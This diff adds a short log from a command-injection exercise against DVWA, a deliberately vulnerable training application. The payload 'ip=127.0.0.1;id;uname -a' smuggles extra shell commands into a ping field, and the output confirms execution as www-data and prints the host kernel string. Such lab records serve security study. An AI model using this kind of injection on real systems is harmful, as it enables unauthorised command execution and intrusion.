@@ -1,0 +1,12 @@
+# DVWA Command Injection (security=low) — payload: ip=127.0.0.1;id;uname -a
+
+PING 127.0.0.1 (127.0.0.1): 56 data bytes
+64 bytes from 127.0.0.1: icmp_seq=0 ttl=64 time=0.785 ms
+64 bytes from 127.0.0.1: icmp_seq=1 ttl=64 time=0.788 ms
+64 bytes from 127.0.0.1: icmp_seq=2 ttl=64 time=0.129 ms
+64 bytes from 127.0.0.1: icmp_seq=3 ttl=64 time=0.309 ms
+--- 127.0.0.1 ping statistics ---
+4 packets transmitted, 4 packets received, 0% packet loss
+round-trip min/avg/max/stddev = 0.129/0.503/0.788/0.291 ms
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+Linux 07f1b0c98785 6.10.14-linuxkit #1 SMP Sat May 17 08:28:57 UTC 2025 x86_64 GNU/Linux
